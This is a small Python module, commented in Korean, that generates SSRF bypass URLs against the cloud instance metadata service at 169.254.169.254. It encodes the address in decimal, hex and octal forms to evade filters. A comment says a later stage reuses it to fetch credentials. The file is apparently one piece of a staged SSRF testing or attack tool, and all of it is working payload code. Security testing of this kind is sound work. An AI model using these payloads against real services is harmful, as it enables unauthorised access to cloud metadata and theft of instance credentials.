"""
SSRF 우회 기법 페이로드 생성기.
Stage 3 (Bypass Diagnosis)와 Stage 4 (IMDS Exposure)에서 공용으로 사용.
"""
from typing import Callable, Dict

DEFAULT_IMDS_IP = "169.254.169.254"


def _to_decimal(ip: str) -> str:
    parts = list(map(int, ip.split(".")))
    return str((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3])


def _to_hex(ip: str) -> str:
    parts = list(map(int, ip.split(".")))
    return "0x" + "".join(f"{p:02x}" for p in parts)


def _to_octal(ip: str) -> str:
    parts = list(map(int, ip.split(".")))
    return ".".join(f"0{p:o}" for p in parts)


def build_url(technique: str, path: str = "/latest/meta-data/", target_ip: str = DEFAULT_IMDS_IP) -> str:
    """
    기법 이름과 IMDS 경로를 받아서 우회 URL 생성.
    Stage 4에서 credential 조회 시 path만 바꿔가며 재사용.
    """
    if technique == "direct":
        host = target_ip
    elif technique == "decimal_ip":
        host = _to_decimal(target_ip)
    elif technique == "hex_ip":
        host = _to_hex(target_ip)
    elif technique == "octal_ip":
        host = _to_octal(target_ip)
    else:
        raise ValueError(f"Unknown bypass technique: {technique}")
    return f"http://{host}{path}"


# Stage 3에서 순차 시도할 기법 목록 (순서 = 진단 순서)
BYPASS_TECHNIQUES = ["direct", "decimal_ip", "hex_ip", "octal_ip"]


if __name__ == "__main__":
    for t in BYPASS_TECHNIQUES:
        print(f"{t:15s} -> {build_url(t)}")
